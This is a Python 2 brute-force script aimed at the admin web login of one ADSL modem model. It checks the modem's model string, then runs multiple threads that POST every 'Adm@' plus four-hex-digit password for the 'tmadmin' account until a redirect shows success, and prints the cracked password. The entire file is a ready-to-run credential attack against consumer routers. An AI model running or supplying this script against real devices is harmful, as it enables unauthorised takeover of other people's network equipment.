#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import threading
import Queue
import os
import sys
import timeit
from requests.exceptions import ConnectionError

if len(sys.argv)== 2:
    target = str(sys.argv[1])
else:
    print 'Usage: {} TARGET_IP'.format(sys.argv[0])
    sys.exit(2)

queue = Queue.Queue()
threads = []
start = timeit.default_timer()

class BruteThread(threading.Thread):
    def __init__(self, queue, tid):
        threading.Thread.__init__(self)
        self.queue = queue
        self.tid = tid

    def run(self):
        while True:
            try:
                dapw = self.queue.get(timeout=1)
            except Queue.Empty():
                break
            
            try:
                payload = {'LoginNameValue':'tmadmin','LoginPasswordValue':dapw}
                r = requests.post('http://'+target+'/Forms/TM2Auth_1', data=payload, allow_redirects=False, timeout=60)
                location = r.headers['Location']
            except ConnectionError, e:
                print "\r\033[91m[-] Testing {} Connection Timeout\033[0m".format(dapw)
                
            if 'rpSys.html' in location:
                global start
                stop = timeit.default_timer()
                print "\r\033[92mSuccess! Password is: {}\033[0m".format(dapw)
                print "\r\033[92mUsed {} Seconds to complete.\033[0m".format(stop - start)
                os.kill(os.getpid(), 2)
            else:
                print "\r\033[91m[-] Attempt failed. TEST: {}, RESULT: {}\033[0m".format(dapw, 'Failed')
            self.queue.task_done()

def verify(target):
    try:
        r = requests.get('http://'+target+'/')
    except ConnectionError, e:
        print "\r\033[91m[-] Target Modem Down\033[0m"
        sys.exit(2)
    if "Modem model: ADSL-RIGER-DB120WL" not in r.text:
        print "\r\033[91m[-] Target Modem model not supported.\033[0m"
        sys.exit(2)

verify(target)

for i in range(1,10):
    worker = BruteThread(queue,i)
    worker.setDaemon(True)
    worker.start()
    threads.append(worker)

for x in xrange(65536):
    backnum = len(hex(x).split('0x')[1])
    if backnum < 4:
        num = '0' * (4 - backnum) + hex(x).split('0x')[1]
        queue.put('Adm@' + num.upper())
    else:
        num = hex(x).split('0x')[1]
        queue.put('Adm@' + num.upper())

queue.join()

for item in threads:
    item.join()

print 'Done!'
os.kill(os.getpid(), 2)
